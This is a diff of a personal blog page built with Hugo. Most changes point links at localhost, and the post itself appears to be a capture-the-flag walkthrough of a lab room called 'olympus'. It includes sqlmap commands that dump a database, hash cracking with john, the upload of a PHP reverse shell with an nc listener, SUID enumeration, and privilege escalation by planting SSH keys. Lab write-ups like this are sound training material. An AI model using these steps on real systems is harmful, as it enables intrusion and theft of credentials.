@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="ro-ro">
-<head><meta charset="utf-8">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -19,7 +19,7 @@
 <meta property="og:locale" content="ro-ro" />
 <meta name="language" content="ro-ro" />
 
-  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/olympus/" title="" />
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/blog/posts/olympus/" title="" />
 
 
 
@@ -32,7 +32,7 @@
     <meta property="og:type" content="article" />
     <meta property="og:article:published_time" content=2026-03-17T08:45:13Z />
     <meta property="article:published_time" content=2026-03-17T08:45:13Z />
-    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/olympus/" />
+    <meta property="og:url" content="http://localhost:1313/blog/posts/olympus/" />
 
     
 
@@ -67,7 +67,7 @@
 <meta name="generator" content="Hugo 0.157.0">
 
     
-    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/olympus/">
+    <meta property="og:url" content="http://localhost:1313/blog/posts/olympus/">
   <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
   <meta property="og:title" content="olympus">
   <meta property="og:description" content="1 minute room they say
@@ -109,7 +109,7 @@ use :">
 
     
 
-    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/olympus/">
+    <link rel="canonical" href="http://localhost:1313/blog/posts/olympus/">
     <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
     <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -123,7 +123,7 @@ use :">
 
 
 
-<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+<link rel="manifest" href="http://localhost:1313/blog/site.webmanifest">
 
 <meta name="msapplication-config" content="/blog/browserconfig.xml">
 <meta name="msapplication-TileColor" content="#2d89ef">
@@ -135,7 +135,6 @@ use :">
 
     
     
-    
       
 <link rel="icon" type="image/png" href="/favicon.png">
 <link rel="shortcut icon" href="/favicon.png">
@@ -144,9 +143,9 @@ use :">
 
 
 <body>
-    <nav>
-    <div class="logo">
-        <a href="https://novaclearnscyber.github.io/blog/" title="Cyber Blog-ul lui Novac">
+    <div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/blog/" class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
 stroke-linejoin="round" class="feather feather-home">
@@ -155,19 +154,34 @@ stroke-linejoin="round" class="feather feather-home">
 <polyline points="9 22 9 12 15 12 15 22"></polyline>
 </svg>
         </a>
-    </div>
-    
-    <ul class="menu">
-        
-        <li>
-            <a href="/blog/categories/">
-                Categories
-            </a>
-        </li>
-        
-    </ul>
-    
-</nav>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
 
     <style>
         .custom-banner {
@@ -195,7 +209,7 @@ stroke-linejoin="round" class="feather feather-home">
     
     <div class="custom-banner">
         <div
-            style="background-image: url('https://novaclearnscyber.github.io/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+            style="background-image: url('http://localhost:1313/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
         </div>
     </div>
     
@@ -219,39 +233,52 @@ stroke-linejoin="round" class="feather feather-home">
             <div class="page-content">
                 <p>1 minute room they say</p>
 <p>first scan<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260315100831.png" alt=""></p>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260315100831.png" alt="">
+</p>
 <p>Found an interesting directory when enumerating<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316065920.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316065920.png" alt="">
+<br>
 let&rsquo;s access it<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316070058.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316070058.png" alt="">
+<br>
 Interesting login form here , we may use sqlmap on this<br>
 i am new to sqlmap so i am going to use &ndash;wizard option<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316082518.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316082518.png" alt="">
+<br>
 enter the url when prompted and let it do its job</p>
 <p>we find the current database being Olympus<br>
 enumerating Olympus using :</p>
 <p>we see there are 6 tables inside it, dump them all<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316083909.png" alt="">use :</p>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316083909.png" alt="">
+use :</p>
 <pre tabindex="0"><code>sqlmap -r sqlREQ --batch --dump-all -D olympus 
 </code></pre><p>this way we get both the user table witch seems interesting<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316085702.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316085702.png" alt="">
+<br>
 first flag</p>
-<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260316085804.png" alt=""><br>
+<p><img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316085804.png" alt="">
+<br>
 and we got some intering hashes<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316092550.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316092550.png" alt="">
+<br>
 i copy pasted the Prometheus hash into a file and run john on it, it going to take some time<br>
 and after a long waiting time we get the Prometheus pass being summertime, lets log in<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316093332.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316093332.png" alt="">
+<br>
 after logging in and going to the add post tab inside the post menu in the right menu we see this form , this may look like a xss injection<br>
 yes this dosent work<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260316094314.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260316094314.png" alt="">
+<br>
 let&rsquo;s look inside the users , we may observe that all the users have a chat.olympus.thm email address, this may be another subdomain , let&rsquo;s access it</p>
 <p>first of all we need to add the domain to the /etc/host using <code>sudo nano /etc/hosts</code> like this :<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317030002.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317030002.png" alt="">
+<br>
 now let&rsquo;s access the web page<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317030057.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317030057.png" alt="">
+<br>
 cool we can login us Prometheus<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317030139.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317030139.png" alt="">
+<br>
 ok interesting looks like a chat app , running inside home.php , we may use a php reverse shell here<br>
 rev shell that i used</p>
 <pre tabindex="0"><code>&lt;?php
@@ -444,42 +471,57 @@ function printit ($string) {
 
 ?&gt;
 </code></pre><p>is important to save this rev shell script as a .php file<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317032929.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317032929.png" alt="">
+<br>
 now that we upload a shell we have to acces it somehow , for this lets run another sqlmap command</p>
 <pre tabindex="0"><code>sqlmap -u &#34;http://olympus.thm/~webmaster/search.php&#34; --data=&#34;search=1337*&amp;submit=&#34; --dbs --random-agent -v 3 --batch -D olympus --dump --fresh-querie
 </code></pre><p>this command will return a table that should look like that<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317034333.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317034333.png" alt="">
+<br>
 now if we start a listener with</p>
 <pre tabindex="0"><code>rlwrap nc -lnvp 79 
 </code></pre><p>and access<br>
 <code>http://chat.olympus.thm/uploads/&lt;YOUR_HASH&gt;.php</code><br>
 we should receive a rev shell<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317034551.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317034551.png" alt="">
+<br>
 and boom RCE<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317034708.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317034708.png" alt="">
+<br>
 we can upgrade the shell like this<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317035108.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317035108.png" alt="">
+<br>
 lets enumerate some SUID with</p>
 <pre tabindex="0"><code>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
 </code></pre><p>before that we cand find naother flag in zeus home<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317035311.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317035311.png" alt="">
+<br>
 the SUID returned us an interesting binary at : /usr/bin/cputils that copies file from one location to another , knowing that we can switch the location of our ssh keys with the zeus account ,first of all we need to create a ssh key on our machine like this<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317043327.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317043327.png" alt="">
+<br>
 now we need to copy on our working directory like this<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317043621.png" alt=""><br>
-then we need to cat our pub key like this <img src="/images/blog-ul-meu/static/Pasted%20image%2020260317043805.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317043621.png" alt="">
+<br>
+then we need to cat our pub key like this <img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317043805.png" alt="">
+<br>
 then run cputils like this<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317043857.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317043857.png" alt="">
+<br>
 and now connect to zeus using ssh and the key<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317043922.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317043922.png" alt="">
+<br>
 and we are zeus<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317044116.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317044116.png" alt="">
+<br>
 after enumerating some files we find this<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317044257.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317044257.png" alt="">
+<br>
 wierd php file lets cat it<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317044328.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317044328.png" alt="">
+<br>
 SUID FOUNDDDD !!!!!!!<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260317044411.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260317044411.png" alt="">
+<br>
 and we found the last flag using</p>
 <pre tabindex="0"><code>grep -irl &#39;flag{&#39;
 </code></pre>
